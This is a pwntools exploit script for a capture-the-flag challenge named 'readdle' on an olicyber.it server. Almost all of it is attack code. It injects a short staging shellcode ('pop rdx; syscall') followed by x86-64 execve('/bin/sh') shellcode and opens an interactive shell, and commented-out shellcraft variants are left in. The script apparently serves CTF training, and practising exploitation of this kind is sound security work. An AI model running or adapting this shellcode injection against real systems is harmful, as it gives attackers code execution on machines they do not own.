from pwn import *

elf = context.binary = ELF('./readdle')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("readdle.challs.olicyber.it", 10018)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b *main+260
    c
       ''')
else:
    conn = elf.process()
# shellcode = p64(int())

payload = asm("""
    pop rdx
    syscall
""")
    #xor r10d, r10d /* 0 */
    #push SYS_execve /* 0x3b */
    #pop rax
    #push 1
    #pop rdi
    #push 2
    #pop rdx
    #mov rsi, rsp
    #syscall
cosichesifa= b'A'*3 + asm(""" 
    mov rdi, 0x1337021
    mov rsi, 0
    mov rdx, 0
    mov rax, 0x3b
    syscall
    """)+ b"/bin/sh\x00" 
print(len(payload))

#payload += b'A'*16 + p64(0x7ffcc08c4350)
#asm(shellcraft.amd64.linux.syscall('SYS_execve', 1, 'rsp', 2, 0).rstrip())
#conn.sendline(asm(shellcraft.amd64.mov('edx', 0x80010101)))
#conn.sendline(asm(shellcraft.amd64.linux.syscall('SYS_execve', 1, 'rsp', 2, 0).rstrip()))
conn.sendline(payload)
conn.sendline(cosichesifa)
conn.interactive()